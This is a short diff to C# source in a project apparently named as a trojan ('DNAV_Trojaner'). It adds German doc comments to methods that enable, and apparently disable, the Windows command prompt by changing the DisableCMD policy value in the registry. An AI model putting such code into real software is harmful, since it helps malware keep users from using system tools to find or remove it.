@@ -4,6 +4,9 @@ namespace DNAV_Trojaner
 {
     public class Cmd
     {
+        /// <summary>
+        /// Aktiviert die Konsole
+        /// </summary>
         public static void Enable()
         {
             RegistryKey cmd = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
@@ -12,7 +15,9 @@ namespace DNAV_Trojaner
                 cmd.DeleteValue("DisableCMD");
             }
         }
-
+        /// <summary>
+        /// Deaktiviert die Konsole
+        /// </summary>
         public static void Disbable()
         {
             RegistryKey cmd = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System");
